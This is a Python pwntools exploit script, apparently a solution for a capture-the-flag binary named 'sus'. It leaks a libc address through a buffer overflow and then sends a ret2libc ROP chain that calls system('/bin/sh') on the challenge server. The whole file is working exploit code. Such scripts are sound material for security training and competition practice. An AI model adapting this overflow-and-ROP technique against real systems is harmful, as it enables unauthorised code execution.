#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sus'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=True)
context.log_level = 'debug'
host, port = 'chall.lac.tf', 31284

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break main
break sus
break *0x00000000004011a2
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    payload = flat(
        b'A' * 56,
        elf.got['puts'],
        b'aaaabaaa',
        elf.plt['puts'],
        elf.sym['main']
    )
    io.sendlineafter(b'?\n', payload)       # Send the payload
    puts_leak = unpack(io.recvline().strip().ljust(8, b'\x00'))

    libc_base = puts_leak - 0x077980

    pop_rdi = 0x1034d0 + libc_base
    binsh = 0x196031 + libc_base
    system = libc_base + 0x4c490
    ret = 0x27182 + libc_base

    log.info('Puts leak: %#x', puts_leak)
    log.info('Libc base: %#x', libc_base)
    log.info('Pop rdi: %#x', pop_rdi)
    log.info('Binsh: %#x', binsh)
    log.info('System: %#x', system)

    offset = 72
    payload = flat({
        offset: [
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })
    io.sendlineafter(b'?\n', payload)

    io.interactive()
if __name__ == '__main__':
    exploit()